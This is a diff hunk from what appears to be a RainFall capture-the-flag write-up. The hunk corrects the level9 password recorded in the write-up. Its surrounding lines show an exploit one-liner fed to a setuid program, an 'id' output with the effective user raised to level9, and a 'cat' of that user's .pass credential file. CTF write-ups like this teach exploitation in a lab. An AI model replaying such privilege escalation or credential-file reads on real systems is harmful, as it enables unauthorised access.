@@ -194,7 +194,7 @@ level8@RainFall:~$ (echo -e "auth root\n"; echo "service AAAAAAAAAAAAAAAAAAAA\n"
 id
 uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
 cat /home/user/level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
 As EUID is setted to `level9` it allows to read `.pass` file.
 
